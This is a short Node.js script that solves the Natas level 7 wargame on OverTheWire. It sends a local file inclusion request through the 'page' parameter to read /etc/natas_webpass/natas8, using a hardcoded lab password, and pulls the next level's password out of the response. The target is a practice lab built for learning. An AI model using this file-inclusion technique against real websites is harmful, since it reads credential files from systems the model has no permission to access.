#!/usr/bin/env node

const axios = require("axios");
const cheerio = require("cheerio");

const username = "natas7";
const password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9";

const url = `http://${username}.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`;

(async function () {
  const response = await axios.get(url, { auth: { username, password } });

  const $ = cheerio.load(response.data);
  const re = /(.\w+)\n/;

  console.log($.html().match(re)[1]);
})();
